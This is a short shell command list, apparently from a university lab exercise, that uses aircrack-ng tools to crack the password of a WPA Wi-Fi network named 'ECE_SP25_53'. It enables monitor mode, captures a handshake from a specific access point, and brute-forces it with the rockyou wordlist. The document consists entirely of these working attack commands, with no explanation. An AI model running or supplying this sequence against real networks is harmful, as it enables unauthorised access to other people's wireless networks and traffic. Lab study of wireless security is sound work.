sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng --essid "ECE_SP25_53" wlan0mon
sudo airodump-ng --bssid b0:b2:1c:a9:29:ad --channel 1 --write handshk wlan0mon
sudo aircrack-ng -b b0:b2:1c:a9:29:ad handshk-01.cap -w /usr/share/wordlists/rockyou.txt
